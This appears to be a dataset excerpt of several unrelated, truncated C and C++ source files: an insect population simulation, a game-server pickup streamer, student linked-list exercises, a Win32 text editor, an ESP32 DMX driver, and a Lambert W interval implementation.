(max_t / save_every) + 1;\n    if (max_t % save_every > 0) n_rows_wasps++;\n    n_rows_wasps *= n_fields;\n\n    // For aphids, you also include plants, lines, and type (alate, apterous,\n    // parasitized). If `sep_adults == TRUE`, then you have separate\n    // rows for adult vs juvenile apterous and adult vs juvenile alates.\n    n_rows = n_plants * n_lines * n_rows_wasps;\n    if (sep_adults) {\n        /*\n         for (1) juvenile alate vs (2) adult alate vs\n         (3) juvenile apterous vs (4) adult apterous vs (5) parasitized\n         */\n        n_rows *= 5;\n    } else n_rows *= 3;  // for (1) alate vs (2) apterous vs (3) parasitized\n    n_rows += n_plants * n_rows_wasps;  // for mummies\n\n    return;\n}\n\n\n\n\nstruct RepSummary {\n\n    bool sep_adults;\n\n    std::vector<uint32> rep;\n    std::vector<uint32> time;\n    std::vector<uint32> field;\n    std::vector<uint32> plant;\n    std::vector<std::string> line;\n    std::vector<std::string> type;\n    std::vector<double> N;\n    std::vector<uint32> wasp_rep;\n    std::vector<uint32> wasp_time;\n    std::vector<uint32> wasp_field;\n    std::vector<double> wasp_N;\n\n    // Don't allow default constructor\n    RepSummary() = delete; // will never be generated\n\n    RepSummary(const bool& sep_adults_)\n        : sep_adults(sep_adults_),\n          rep(), time(), field(), plant(), line(), type(), N(),\n          wasp_rep(), wasp_time(), wasp_field(), wasp_N(), r() {};\n\n    void reserve(const uint32& rep_,\n                 const uint32& max_t,\n                 const uint32& save_every,\n                 const uint32& n_lines,\n                 const uint32& n_fields,\n                 const uint32& n_plants) {\n        uint32 n_rows, n_rows_wasps;\n        calc_rep_rows(n_rows, n_rows_wasps, max_t, save_every,\n                      n_lines, n_fields, n_plants, sep_adults);\n        rep.reserve(n_rows);\n        time.reserve(n_rows);\n        field.reserve(n_rows);\n        plant.reserve(n_rows);\n        line.reserve(n_rows);\n        type.reserve(n_rows);\n        N.reserve(n_rows);\n        wasp_rep.reserve(n_rows_wasps);\n        wasp_time.reserve(n_rows_wasps);\n        wasp_field.reserve(n_rows_wasps);\n        wasp_N.reserve(n_rows_wasps);\n        r = rep_;\n    }\n\n    // This version used when assimilating all rep",
    "/*\n * Copyright (C) 2017 Incognito\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"../main.h\"\n\n#include \"../natives.h\"\n#include \"../core.h\"\n#include \"../utility.h\"\n\ncell AMX_NATIVE_CALL Natives::CreateDynamicPickup(AMX *amx, cell *params)\n{\n\tCHECK_PARAMS(11);\n\tif (core->getData()->getGlobalMaxItems(STREAMER_TYPE_PICKUP) == core->getData()->pickups.size())\n\t{\n\t\treturn INVALID_STREAMER_ID;\n\t}\n\tint pickupId = Item::Pickup::identifier.get();\n\tItem::SharedPickup pickup(new Item::Pickup);\n\tpickup->amx = amx;\n\tpickup->pickupId = pickupId;\n\tpickup->inverseAreaChecking = false;\n\tpickup->originalComparableStreamDistance = -1.0f;\n\tpickup->positionOffset = Eigen::Vector3f::Zero();\n\tpickup->streamCallbacks = false;\n\tpickup->modelId = static_cast<int>(params[1]);\n\tpickup->type = static_cast<int>(params[2]);\n\tpickup->position = Eigen::Vector3f(amx_ctof(params[3]), amx_ctof(params[4]), amx_ctof(params[5]));\n\tUtility::addToContainer(pickup->worlds, static_cast<int>(params[6]));\n\tUtility::addToContainer(pickup->interiors, static_cast<int>(params[7]));\n\tUtility::addToContainer(pickup->players, static_cast<int>(params[8]));\n\tpickup->comparableStreamDistance = amx_ctof(params[9]) < STREAMER_STATIC_DISTANCE_CUTOFF ? amx_ctof(params[9]) : amx_ctof(params[9]) * amx_ctof(params[9]);\n\tpickup->streamDistance = amx_ctof(params[9]);\n\tUtility::addToContainer(pickup->areas, static_cast<int>(params[10]));\n\tpickup->priority = static_cast<int>(params[11]);\n\tcore->getGrid()->addPickup(pickup);\n\tcore->getData()->pickups.insert(std::make_pair(pickupId, pickup));\n\treturn static_cast<cell>(pickupId);\n}\n\ncell AMX_NATIVE_CALL Natives::DestroyDynamicPickup(AMX *amx, cell *params)\n{\n\tCHECK_PARAMS(1);\n\tstd::unordered_map<int, Item::SharedPickup>::iterator p = core->getData()->pickups.find(static_cast<int>(params[1]));\n\tif (p != core->getData()->pickups.end())\n\t{\n\t\tUtility::destroyPickup(p);\n\t\treturn 1;\n\t}\n\treturn 0;\n}\n\ncell AMX_NATIVE_CALL Natives::IsValidDynamicPickup(AMX *amx, cell *params)\n{\n\tCHECK_PARAMS(1);\n\tstd::unordered_map<int, Item::SharedPickup>::iterator p = core->getData()->pickups.find(static_cast<int>(params[1]));\n\tif (p != core->getData()->pickups.end())\n\t{\n\t\treturn 1;\n\t}\n\treturn 0;\n}\n",
    "#include<iostream>\nusing namespace std;\nstruct node\n{\n\tint data;\n\tnode* next;\n\tnode* previous;\n};\n\nnode* head = NULL;\nnode* current = NULL;\nnode* tail = NULL;\nnode* Beg = NULL;\nnode* End = NULL;\nnode* index = NULL;\n\nint loc = 0;\nint Leanth = 0;\nbool flag = false;\n\n// Linked List Operations\nvoid insert(int newdata)\n{\n\tcurrent = new node;\n\tcurrent->data = newdata;\n\tcurrent->next = NULL;\n\n\tif (head == NULL)\n\t{\n\t\thead = current;\n\t\ttail = current;\n\t}\n\telse\n\t{\n\t\tcurrent->previous = tail;\n\t\ttail->next = current;\n\t\ttail = tail->next;\n\t}\n}\nvoid AddToHead(int newdata)\n{\n\tcurrent = new node;\n\tcurrent->data = newdata;\n\tcurrent->next = NULL;\n\tif (head == NULL)\n\t{\n\t\thead = current;\n\t\ttail = current;\n\t}\n\telse\n\t{\n\t\tcurrent->next = head;\n\t\thead = current;\n\t}\n}\nvoid deleteNode(int Deldata) {\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\tif (current->data == Deldata)\n\t\t{\n\t\t\thead = head->next;\n\t\t\tdelete current;\n\t\t}\n\t\telse\n\t\t{\n\t\t\twhile (current != NULL)\n\t\t\t{\n\t\t\t\tif ((current->next)->data == Deldata)\n\t\t\t\t{\n\t\t\t\t\t(current->next) = (current->next)->next;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse { current = current->next; }\n\t\t\t}\n\t\t}\n\t}\n\telse { cout << \"No Data Found\" << endl; }\n}\nvoid destoryList()\n{\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\thead = head->next;\n\t\t\tdelete current;\n\t\t\tcurrent = head;\n\t\t}\n\t\thead = NULL;\n\t\ttail = NULL;\n\t\tcout << \"The list is Destroyed Successfully\" << endl;\n\t}\n\telse\n\t{\n\t\tcout << \"There is no list to be destroyed\" << endl;\n\t}\n}\nvoid display()\n{\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\tcout << \"Data:\" << endl;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse\n\t{\n\t\tcout << \"No Data Found\" << endl;\n\t}\n}\n\n//Sequential Search\nvoid sequentialSearch(int item) {\n\tcurrent = head;\n\twhile (current->next != NULL)\n\t{\n\t\tif (current->data == item)\n\t\t{\n\t\t\tcout << \"Search is successful\\n\";\n\t\t\tcout << \"Item is: \" << item << endl;\n\t\t\tflag = true;\n\t\t}\n\t\tcurrent = current->next;\n\t}\n\tif (flag == false)\n\t{\n\t\tcout << \"Search is not successful\\n\";\n\t}\n}\n//Binary Search\nnode* middle(node* start, node* last) \n{\n\tif (start == NULL)\n\t\treturn NULL;\n\tnode* slow = start;\n\tnode* fast = start->next;\n\twhile(fast != last)\n\t{\n\t\tfast = fast->next;\n\t\tif (fast != last)\n\t\t{\n\t\t\tslow = slow->next;\n\t\t\tfast = fast->next;\n\t\t}\n\t}\n\treturn slow;\n}\nnode* binarySearch(node* head, int key)\n{\n\tnode* start = head;\n\tnode* last = NULL;\n\tdo\n\t{\n\t\tnode* mid= middle(start, last);\n\t\tif (mid == NULL)\n\t\t\treturn NULL;\n\n\t\tif (mid->data == key) {\n\t\t\treturn mid;\n\t\t}\n\t\telse if (mid->data < key) {\n\t\t\tstart = mid->next; \n\t\t}\n\t\telse {\n\t\t\tlast = mid;\n\t\t}\n\t} while (last == NULL || last != start);\n\treturn NULL;\n}\nvoid location(int item) {\n\tcurrent = head;\n\twhile (current != NULL) {\n\t\tloc++;\n\t\tif (current->data == item)\n\t\t\tbreak;\n\t\tcurrent = current->next;\n\t}\n}\n//Jump Search\nint jumpSearch(int ele, int len) {\n\tcurrent = head;\n\tint step = sqrt(len);\n\n\twhile (current->next != NULL && current->data < ele)\n\t{\n\t\tcurrent = current->next;\n\t\tstep--;\n\t\tif (step == 0) {\n\t\t\tstep = sqrt(len);\n\n\t\t\tif (current->data == ele)\n\t\t\t\treturn 1;\n\t\t}\n\t\twhile (step != 0 && current != NULL)\n\t\t{\n\t\t\tnode* c = current;\n\t\t\tif (c->data == ele)\n\t\t\t\treturn 1;\n\t\t\telse\n\t\t\t\tc = c->previous;\n\t\t}\n\t}\n}\n//Interpolation Search\nvoid interpolationSearch(int item) {\n\twhile (head->data <= tail->data && item >= head->data && item <=tail->data){\n\t\tif (Beg == End) {\n\t\t\tif (Beg->data == item)\n\t\t\t{\n\t\t\t\tindex->data = Beg->data;\n\t\t\t}\n\t\t}\n\t\tindex = Beg + ((End - Beg) / (End->data - Beg->data)) * (item - Beg->data);\n\t\tif (index->data == item)\n\t\t{\n\t\t\tflag = true;\n\t\t\tcout << \"Number is founded at list :\" << item << endl;\n\t\t}\n\t\tif (index->data < item)\n\t\t\tBeg->data = index->data + 1;\n\t\telse\n\t\t\tEnd->data = index->data - 1;\n\t}\n\tif (flag == false)\n\t\tcout << \"Search is not successful\\n\";\n}\n\nvoid app() {\n\t/*\n\t\top -> operation\n\t\tins -> insert\n\t\tath -> add to head\n\t\tdn -> deleted node\n\t\tc -> confirm\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\n\tint op, ins, ath, dn, c, ao, s;\n\tint num;\n\tcout << \"---* Welcome to linked list implementation with sorting algorithms *---\\n\";\n\tdo {\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Insert -> (1)\\n\";\n\t\tcout << \"Add to head -> (2)\\n\";\n\t\tcout << \"Delete node -> (3)\\n\";\n\t\tcout << \"Display -> (4)\\n\";\n\t\tcout << \"Destory list -> (5)\\n\";\n\t\tcout << \"Searching -> (6)\\n\";\n\t\tcout << \"Exit -> (7)\\n\";\n\t\tcin >> op;\n\t\tif (op == 1) {\n\t\t\tcout << \"Enter value do you want to add to head\\n\";\n\t\t\tcin >> ins;\n\t\t\tinsert(ins);\n\t\t\tdisplay();\n\t\t}\n\t\telse if (op == 2) {\n\t\t\tcout << \"Enter value do you want to add to head\\n\";\n\t\t\tcin >> ath;\n\t\t\tAddToHead(ath);\n\t\t\tdisplay();\n\t\t}\n\t\telse if (op == 3) {\n\t\t\tdisplay();\n\t\t\tcout << \"Choise the node \\n\";\n\t\t\tcin >> dn;\n\t\t\tcout << \"Are you sure to delete this node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdeleteNode(dn);\n\t\t\t\tcout << \"\\nCheck data of list after deleting node : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Delete is c",
    "#include <windows.h>\n#include <commdlg.h>\n#include <fstream>\n#include <string>\n#include \"resource.h\"\n\nconst wchar_t* CLASS_NAME = L\"Notepad\";\nHWND hwndEdit;\nWNDPROC originalEditProc;\n\nLRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);\nLRESULT CALLBACK EditProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);\n\nstd::wstring StringToWString(const std::string& str) {\n    return std::wstring(str.begin(), str.end());\n}\n\nvoid OpenFile(HWND hwnd) {\n    OPENFILENAMEW ofn;\n    wchar_t szFile[260] = { 0 };\n\n    ZeroMemory(&ofn, sizeof(ofn));\n    ofn.lStructSize = sizeof(ofn);\n    ofn.hwndOwner = hwnd;\n    ofn.lpstrFile = szFile;\n    ofn.nMaxFile = sizeof(szFile) / sizeof(wchar_t);\n    ofn.lpstrFilter = L\"Text Files\\0*.TXT\\0All Files\\0*.*\\0\";\n    ofn.nFilterIndex = 1;\n    ofn.lpstrFileTitle = NULL;\n    ofn.nMaxFileTitle = 0;\n    ofn.lpstrInitialDir = NULL;\n    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;\n\n    if (GetOpenFileNameW(&ofn)) {\n        std::ifstream file(ofn.lpstrFile);\n        if (file.is_open()) {\n            std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());\n            SetWindowTextW(hwndEdit, StringToWString(content).c_str());\n        }\n    }\n}\n\nvoid SaveFile(HWND hwnd, HWND hwndEdit) {\n    OPENFILENAMEW ofn;\n    wchar_t szFile[260] = { 0 };\n\n    wcscpy_s(szFile, L\"*.txt\");\n\n    ZeroMemory(&ofn, sizeof(ofn));\n    ofn.lStructSize = sizeof(ofn);\n    ofn.hwndOwner = hwnd;\n    ofn.lpstrFile = szFile;\n    ofn.nMaxFile = sizeof(szFile) / sizeof(wchar_t);\n    ofn.lpstrFilter = L\"Text Documents (*.txt)\\0*.txt\\0All Files (*.*)\\0*.*\\0\";\n    ofn.nFilterIndex = 1;\n    ofn.lpstrFileTitle = NULL;\n    ofn.nMaxFileTitle = 0;\n    ofn.lpstrInitialDir = NULL;\n    ofn.Flags = OFN_PATHMUSTEXIST | OFN_OVERWRITEPROMPT;\n\n    if (GetSaveFileNameW(&ofn)) {\n        std::wstring filePath(ofn.lpstrFile);\n        if (filePath.find(L\".\") == std::wstring::npos) {\n            filePath += L\".txt\";\n        }\n\n        int len = GetWindowTextLengthW(hwndEdit) + 1;\n        wchar_t* buffer = new wchar_t[len];\n        GetWindowTextW(hwndEdit, buffer, len);\n\n        std::wofstream file(filePath.c_str());\n        if (file.is_open()) {\n            file.write(buffer, len - 1);\n        }\n        delete[] buffer;\n    }\n}\n\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {\n    WNDCLASSW wc = {};\n    wc.lpfnWndProc = WindowProc;\n    wc.hInstance = hInstance;\n    wc.lpszClassName = CLASS_NAME;\n\n    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n\n    RegisterClassW(&wc);\n\n    HWND hwnd = CreateWindowExW(\n        0,\n        CLASS_NAME,\n        L\"Notepad\",\n        WS_OVERLAPPEDWINDOW,\n        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,\n        NULL,\n        NULL,\n        hInstance,\n        NULL\n    );\n\n    if (hwnd == NULL) {\n        return 0;\n    }\n\n    ShowWindow(hwnd, nCmdShow);\n\n    MSG msg = {};\n    while (GetMessage(&msg, NULL, 0, 0)) {\n        TranslateMessage(&msg);\n        DispatchMessage(&msg);\n    }\n\n    return 0;\n}\n\nLRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {\n    switch (uMsg) {\n        case WM_CREATE: {\n    HMENU hMenu = CreateMenu();\n    HMENU hFileMenu = CreateMenu();\n    HMENU hEditMenu = CreateMenu();\n\n    AppendMenuW(hFileMenu, MF_STRING, 1, L\"New\");\n    AppendMenuW(hFileMenu, MF_STRING, 2, L\"Open\");\n    AppendMenuW(hFileMenu, MF_STRING, 3, L\"Save\");\n    AppendMenuW(hFileMenu, MF_SEPARATOR, 0, NULL);\n    AppendMenuW(hFileMenu, MF_STRING, 4, L\"Exit\");\n\n    AppendMenuW(hEditMenu, MF_STRING, 5, L\"Undo\");\n    AppendMenuW(hEditMenu, MF_STRING, 6, L\"Cut\");\n    AppendMenuW(hEditMenu, MF_STRING, 7, L\"Copy\");\n    AppendMenuW(hEditMenu, MF_STRING, 8, L\"Paste\");\n\n    AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hFileMenu, L\"File\");\n    AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hEditMenu, L\"Edit\");\n\n    SetMenu(hwnd, hMenu);\n\n    hwndEdit = CreateWindowExW(\n        0, L\"EDIT\", L\"\",\n        WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_WANTRETURN,\n        0, 0, CW_USEDEFAULT, CW_USEDEFAULT,\n        hwnd, (HMENU)101, GetModuleHandle(NULL), NULL\n    );\n\n    HFONT hFont = CreateFontW(\n        -MulDiv(11, GetDeviceCaps(GetDC(hwnd), LOGPIXELSY), 72), 0, 0, 0, FW_NORMAL, \n        FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, \n        CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_MODERN | FIXED_PITCH, L\"Consolas\"\n    );\n    SendMessage(hwndEdit, WM_SETFONT, (WPARAM)hFont, TRUE);\n\n    originalEditProc = (WNDPROC)SetWindowLongPtr(hwndEdit, GWLP_WNDPROC, (LONG_PTR)EditProc);\n}\nbreak;\n\n        case WM_SIZE: {\n            RECT rcClient;\n            GetClientRect(hwnd, &rcClient);\n            SetWindowPos(hwndEdit, NULL, 0, 0, rcClient.right, rcClient.bottom, SWP_NOZORDER);\n        }\n        break;\n\n        case WM_COMMAND: {\n            switch (LOWORD(wParam)) {\n                case 1: // New\n                    SetWindowTextW(hwndEdit, L\"\");\n                    b",
    "/* ----- LIBRARIES ----- */\n#include <Arduino.h>\n#include \"ESPDMX.h\"\n\n// DMX value array and size. Entry 0 will hold startbyte, so we need 512+1 elements\n// std::vector<uint8_t[DMXCHANNELS + 1]> dmxDataStores(MAX_IDS);\n// uint8_t dmxDataStores[MAX_IDS][DMXCHANNELS + 1];\n\n// Set up the DMX-Protocol\nvoid DMXESPSerial::init(int pinSend = 19, int pinRecv = -1)\n{\n    sendPin = pinSend;\n    recvPin = pinRecv;\n    SERIALPORT.begin(DMXSPEED, DMXFORMAT, recvPin, sendPin);\n    pinMode(sendPin, OUTPUT);\n    dmxStarted = true;\n}\n\n// Function to read DMX data\nuint8_t DMXESPSerial::read(int channel)\n{\n    if (dmxStarted == false)\n        init();\n\n    if (channel < 1)\n        channel = 1;\n    if (channel > DMXCHANNELS)\n        channel = DMXCHANNELS;\n    return (dmxDataStore[channel]);\n}\n\n// Function to send DMX data\nvoid DMXESPSerial::write(int channel, uint8_t value)\n{\n\n    if (dmxStarted == false)\n        init();\n\n    if (channel < 1)\n        channel = 1;\n    if (channel > DMXCHANNELS)\n        channel = DMXCHANNELS;\n    if (value < 0)\n        value = 0;\n    if (value > 255)\n        value = 255;\n\n    dmxDataStore[channel] = value;\n}\n\nvoid DMXESPSerial::end()\n{\n    SERIALPORT.end();\n}\n\n// Function to update the DMX bus\nvoid DMXESPSerial::update()\n{\n    // Send break\n    digitalWrite(sendPin, HIGH);\n    SERIALPORT.begin(BREAKSPEED, BREAKFORMAT, recvPin, sendPin);\n    SERIALPORT.write(0);\n    SERIALPORT.flush();\n    delay(1);\n    SERIALPORT.end();\n\n    // send data\n    SERIALPORT.begin(DMXSPEED, DMXFORMAT, recvPin, sendPin);\n    digitalWrite(sendPin, LOW);\n    SERIALPORT.write(dmxDataStore, DMXCHANNELS);\n    SERIALPORT.flush();\n    delay(1);\n    SERIALPORT.end();\n}",
    "#include \"../include/ReferenceW2.h\"\n\n#include <cassert>\n#include <cfloat>\n#include <cmath>\n#include <cfenv>\n\n#include <iomanip>\n#include <iostream>\n#include <numeric>\n\n#define SLEEF_STATIC_LIBS\n#include <sleef.h>\n\n// (-1/e) rounded towards +Inf\nstatic const double EM_UP = -0.3678794411714423;\n\nstatic inline double add(double x, double y, int rnd)\n{\n\tfesetround(rnd);\n\treturn x + y;\n}\n\nstatic inline double sub(double x, double y, int rnd)\n{\n\tfesetround(rnd);\n\treturn x - y;\n}\n\nstatic inline double mul(double x, double y, int rnd)\n{\n\tfesetround(rnd);\n\treturn x * y;\n}\n\nstatic inline double div(double x, double y, int rnd)\n{\n\tfesetround(rnd);\n\treturn x / y;\n}\n\nstatic inline double sqrt(double x, int rnd)\n{\n\tfesetround(rnd);\n\treturn sqrt(x);\n}\n\nstatic inline std::pair<double, double> ExpUpDown(double x)\n{\n\tdouble v = Sleef_exp_u10(x);\n\treturn { std::nextafter(v, -INFINITY), std::nextafter(v, INFINITY) };\n}\n\nstatic inline void ExpUpDown(mpfr_t down, mpfr_t up, mpfr_t x)\n{\n\tint isBelow = mpfr_exp(down, x, MPFR_RNDD);\n\tmpfr_set(up, down, MPFR_RNDN);\n\tif (isBelow) mpfr_nextabove(up);\n}\n\nstatic inline std::pair<double, double> LogUpDown(double x)\n{\n\tdouble v = Sleef_log_u10(x);\n\treturn { std::nextafter(v, -INFINITY), std::nextafter(v, INFINITY) };\n}\n\nReferenceW2::ReferenceW2()\n{\n\tmpfr_init2(m, 53);\n\tmpfr_init2(yLowP0, 53);\n\tmpfr_init2(yHighP0, 53);\n\tmpfr_init2(yLowP1, 150);\n\tmpfr_init2(yHighP1, 150);\n}\n\nReferenceW2::~ReferenceW2()\n{\n\tmpfr_clear(m);\n\tmpfr_clear(yLowP0);\n\tmpfr_clear(yHighP0);\n\tmpfr_clear(yLowP1);\n\tmpfr_clear(yHighP1);\n}\n\nInterval ReferenceW2::W0(double x)\n{\n\t// Edge cases\n\tif (x < EM_UP)\n\t\treturn { NAN, NAN };\n\tif (x == INFINITY)\n\t\treturn { DBL_MAX, INFINITY };\n\n\t// === Compute Bracket ===\n\t// high = ln(x + 1)\n\tdouble high = Sleef_log1p_u10(x);\n\thigh = std::nextafter(high, INFINITY);\n\n\tdouble low;\n\tif (x > 3)\n\t{\n\t\t// low = ln(x) - ln(ln(x))\n\t\tauto [logDown, logUp] = LogUpDown(x);\n\t\tlogUp = std::nextafter(Sleef_log_u10(logUp), INFINITY);\n\n\t\tlow = sub(logDown, logUp, FE_DOWNWARD);\n\t}\n\telse if (x >= 0)\n\t{\n\t\t// low = x / (x + 1)\n\t\tdouble xp1 = add(x, 1, FE_UPWARD);\n\t\tlow = div(x, xp1, FE_DOWNWARD);\n\t}\n\telse\n\t{\n\t\t// low = x * (1 - x * 5)\n\t\tdouble x5 = mul(x, 5, FE_DOWNWARD);\n\t\tlow = sub(1, x5, FE_UPWARD);\n\t\tlow = mul(low, x, FE_DOWNWARD);\n\n\t\t// Clamp low above -1\n\t\tif (low < -1)\n\t\t\tlow = -1;\n\t}\n\n\t// === Halley Iterations ===\n\tfor (size_t i = 0; i < 4; i++)\n\t{\n\t\tlow = HalleyW0(x, low, false);\n\t\thigh = HalleyW0(x, high, true);\n\t}\n\n\t// === Bisection ===\n\tauto ret = Bisection(x, low, high, true);\n\tassert(ret.inf == ret.sup || ret.sup == std::nextafter(ret.inf, INFINITY));\n\n\treturn ret;\n}\n\nInterval ReferenceW2::Wm1(double x)\n{\n\t// Edge cases\n\tif (x < EM_UP || x >= 0)\n\t\treturn { NAN, NAN };\n\n\t// === Compute Bracket ===\n\tauto [uUp, uDown] = LogUpDown(-x);\n\n\tuDown = -uDown;\n\tuDown = sub(uDown, 1, FE_DOWNWARD);\n\n\tuUp = -uUp;\n\tuUp = sub(uUp, 1, FE_UPWARD);\n\n\t// low = -1 - (sqrt(u * 2) + u);\n\tdouble low = add(uUp, uUp, FE_UPWARD);\n\tlow = sqrt(low, FE_UPWARD);\n\tlow = add(low, uUp, FE_UPWARD);\n\tlow = sub(-1, low, FE_DOWNWARD);\n\n\t// high = -1 - (sqrt(u * 2) + u * 2 / 3)\n\tdouble high = add(uDown, uDown, FE_DOWNWARD);\n\thigh = sqrt(high, FE_DOWNWARD);\n\tuDown = add(uDown, uDown, FE_DOWNWARD);\n\tuDown = div(uDown, 3, FE_DOWNWARD);\n\thigh = add(high, uDown, FE_DOWNWARD);\n\thigh = sub(-1, high, FE_UPWARD);\n\n\t// === Halley Iterations ===\n\tfor (size_t i = 0; i < 3; i++)\n\t{\n\t\tlow = HalleyWm1(x, low, false);\n\t\thigh = HalleyWm1(x, high, true);\n\t}\n\n\t// === Bisection ===\n\tauto ret = Bisection(x, low, high, false);\n\tassert(ret.inf == ret.sup || ret.sup == std::nextafter(ret.inf, INFINITY));\n\n\treturn ret;\n}\n\n#if TRACK_BISECTIONS\nvoid ReferenceW2::LogBisectionStats() const\n{\n\tstd::cout << \"Num bisections:   \" << numBisections << '\\n';\n\tstd::cout << \"Num inconclusive: \" << numInconclusive << '\\n';\n\tstd::cout << \"Low precision success rate: \" << (double)(numBisections - numInconclusive) / numBisections * 100 << \"%\\n\";\n}\n#endif\n\nReferenceW2::Sign ReferenceW2::GetMidpointSign(double x, double midpoint, bool useHighPrec)\n{\n#if TRACK_BISECTIONS\n\tif (!useHighPrec) numBisections++;\n#endif\n\n\tmpfr_set_d(m, midpoint, MPFR_RNDN);\n\n\tmpfr_t& yLow = useHighPrec ? yLowP1 : yLowP0;\n\tmpfr_t& yHigh = useHighPrec ? yHighP1 : yHighP0;\n\n\t// Compute exp\n\tExpUpDown(yLow, yHigh, m);\n\tif (mpfr_cmp_ui(m, 0) < 0)\n\t\tmpfr_swap(yLow, yHigh);\n\n\t// Compute yLow\n\tmpfr_mul(yLow, yLow, m, MPFR_RNDD);\n\tmpfr_sub_d(yLow, yLow, x, MPFR_RNDD);\n\n\t// Compute yHigh\n\tmpfr_mul(yHigh, yHigh, m, MPFR_RNDU);\n\tmpfr_sub_d(yHigh, yHigh, x, MPFR_RNDU);\n\n\tint lowCmp = mpfr_cmp_ui(yLow, 0);\n\tint highCmp = mpfr_cmp_ui(yHigh, 0);\n\n\tif (lowCmp >= 0 && highCmp >= 0)\n\t\treturn Sign::Positive;\n\tif (lowCmp <= 0 && highCmp <= 0)\n\t\treturn Sign::Negative;\n\n#if TRACK_BISECTIONS\n\tif (!useHighPrec) numInconclusive++;\n#endif\n\n\treturn Sign::Inconclusive;\n}\n\nInterval ReferenceW2::Bisection(double x, double low, double high, bool increasing)\n{\n\tfor (;;)\n\t{\n\t\t// m = (low + high) / 2\n\t\tdouble m = std::midpoint(low, ",
    "#include <stdio.h> // Th\u01b0 vi\u1ec7n chu\u1ea9n C \u0111\u1ec3 s\u1eed d\u1ee5ng printf v\u00e0 scanf\n\n// C\u1ea5u tr\u00fac l\u01b0u tr\u1eef th\u00f4ng tin v\u1ec1 ng\u00e0y sinh\nstruct Ngay {\n    int ngay;\n    int thang;\n    int nam;\n};\n\n// C\u1ea5u tr\u00fac l\u01b0u tr\u1eef th\u00f4ng tin v\u1ec1 sinh vi\u00ean\nstruct SinhVien {\n    char maSV[8];       // M\u00e3 sinh vi\u00ean (7 k\u00fd t\u1ef1 + 1 k\u00fd t\u1ef1 k\u1ebft th\u00fac chu\u1ed7i)\n    char hoTen[50];     // H\u1ecd t\u00ean sinh vi\u00ean (49 k\u00fd t\u1ef1 + 1 k\u00fd t\u1ef1 k\u1ebft th\u00fac chu\u1ed7i)\n    int gioiTinh;       // Gi\u1edbi t\u00ednh (0: N\u1eef, 1: Nam)\n    Ngay ngaySinh;      // Ng\u00e0y sinh\n    char diaChi[100];   // \u0110\u1ecba ch\u1ec9 sinh vi\u00ean\n    char lop[12];       // L\u1edbp sinh vi\u00ean\n    char khoa[7];       // Khoa sinh vi\u00ean\n};\n\n// C\u1ea5u tr\u00fac n\u00fat trong danh s\u00e1ch li\u00ean k\u1ebft \u0111\u1ec3 l\u01b0u tr\u1eef sinh vi\u00ean\nstruct Node {\n    SinhVien data;      // D\u1eef li\u1ec7u sinh vi\u00ean\n    Node* link;         // Con tr\u1ecf \u0111\u1ebfn n\u00fat ti\u1ebfp theo trong danh s\u00e1ch\n};\n\n// C\u1ea5u tr\u00fac danh s\u00e1ch li\u00ean k\u1ebft ch\u1ee9a c\u00e1c sinh vi\u00ean\nstruct List {\n    Node* first;        // Con tr\u1ecf \u0111\u1ebfn n\u00fat \u0111\u1ea7u ti\u00ean c\u1ee7a danh s\u00e1ch\n    Node* last;         // Con tr\u1ecf \u0111\u1ebfn n\u00fat cu\u1ed1i c\u00f9ng c\u1ee7a danh s\u00e1ch\n};\n\n// H\u00e0m kh\u1edfi t\u1ea1o danh s\u00e1ch sinh vi\u00ean r\u1ed7ng\nvoid initList(List &list) {\n    list.first = NULL;\n    list.last = NULL;\n}\n\n// H\u00e0m so s\u00e1nh m\u00e3 sinh vi\u00ean (so s\u00e1nh t\u1eebng k\u00fd t\u1ef1 c\u1ee7a chu\u1ed7i)\nint compareMaSV(char maSV1[], char maSV2[]) {\n    for (int i = 0; i < 7; i++) {\n        if (maSV1[i] < maSV2[i]) return -1;  // Tr\u1ea3 v\u1ec1 -1 n\u1ebfu maSV1 nh\u1ecf h\u01a1n maSV2\n        if (maSV1[i] > maSV2[i]) return 1;   // Tr\u1ea3 v\u1ec1 1 n\u1ebfu maSV1 l\u1edbn h\u01a1n maSV2\n    }\n    return 0; // Tr\u1ea3 v\u1ec1 0 n\u1ebfu hai m\u00e3 sinh vi\u00ean b\u1eb1ng nhau\n}\n\n// H\u00e0m th\u00eam sinh vi\u00ean v\u00e0o danh s\u00e1ch 